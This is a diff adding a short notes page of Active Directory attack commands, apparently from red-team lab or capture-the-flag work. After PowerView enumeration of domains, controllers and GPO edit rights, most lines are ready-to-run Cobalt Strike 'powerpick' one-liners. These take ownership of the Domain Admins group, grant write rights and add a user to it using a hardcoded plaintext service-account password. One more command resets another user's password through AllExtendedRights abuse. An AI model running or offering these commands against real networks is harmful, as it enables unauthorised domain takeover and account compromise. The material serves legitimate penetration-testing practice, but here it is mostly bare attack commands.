@@ -1,0 +1,31 @@
+NEW PAGE
+Add user to domain admin
+
+Get-DomainComputer -Ping -Domain ADMIN.OFFSHORE.COM -Properties dnshostname
+Get-DomainComputer -Ping -Domain ADMIN.OFFSHORE.COM
+
+Get-DomainGroup "Enterprise Admins" -Domain admin.offshore.com
+
+Get-DomainController -Domain ADMIN.OFFSHORE.COM
+
+Command to enumerate who had edit rights over GPO's in a foreign domain
+
+Get-DomainObjectAcl -Domain 'ADMIN.OFFSHORE.COM' -LDAPFilter 'objectCategory=groupPolicyContainer' -ResolveGUIDs | ? {($_.SecurityIdentifier -match 'S-1-5-.*-[1-9]\d{3,}$') -and ` ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner') }
+
+
+powerpick $pass = $pass = ConvertTo-SecureString 'la@3L$-CHILDL0c@l' -AsPlainText -Force; $Cred = New-Object System.Management.Automation.PSCredential('ELS-CHILD.els.local\appsvc', $pass);Set-DomainObjectOwner -Credential $Cred -server LAB-DC01 -Identity "Domain Admins" -OwnerIdentity "ELS-CHILD\uatoperator";Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity "ELS-CHILD\uatoperator" -Rights WriteMembers -Credential $Cred -Verbose
+
+powerpick $pass = $pass = ConvertTo-SecureString 'la@3L$-CHILDL0c@l' -AsPlainText -Force; $Cred = New-Object System.Management.Automation.PSCredential('ELS-CHILD.els.local\appsvc', $pass); Add-DomainGroupMember -Identity 'Domain Admins' -Members "ELS-CHILD\uatoperator" -Credential $Cred
+
+
+
+powerpick $pass = $pass = ConvertTo-SecureString 'la@3L$-CHILDL0c@l' -AsPlainText -Force; $Cred = New-Object System.Management.Automation.PSCredential('ELS-CHILD.els.local\appsvc', $pass);Set-DomainObjectOwner -Credential $Cred -server LAB-DC01 -Identity "Domain Admins" -OwnerIdentity "uatoperator";Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity "uatoperator" -Rights WriteMembers -Credential $Cred;  Add-DomainGroupMember -Identity 'Domain Admins' -Members "ELS-CHILD\uatoperator" -Credential $Cred -Verbose
+
+AllExtendedRights Abuse
+
+$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force; $Cred = New-Object System.Management.Automation.PSCredential('CORP', $SecPassword);$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force;Set-DomainUserPassword -Identity 'salvador@corp.local' -AccountPassword $UserPassword -Credential $Cred -verbose
+
+powerpick Get-DomainGPOLocalGroupMapping
+
+powerpick Get-DomainGPOLocalGroup
+
